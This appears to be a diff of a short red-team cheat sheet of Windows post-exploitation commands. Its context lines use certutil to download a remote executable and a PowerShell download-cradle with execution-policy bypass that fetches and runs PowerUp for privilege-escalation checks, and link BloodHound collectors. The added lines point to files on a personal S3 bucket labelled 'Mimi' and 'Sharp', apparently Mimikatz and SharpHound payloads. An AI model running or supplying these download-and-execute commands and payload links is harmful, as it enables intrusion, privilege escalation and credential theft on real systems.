@@ -17,3 +17,6 @@ certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
 
 https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+
+Mimi - https://girishbucket88.s3.ap-south-1.amazonaws.com/kat.txt
+Sharp - https://girishbucket88.s3.ap-south-1.amazonaws.com/SharpH.txt
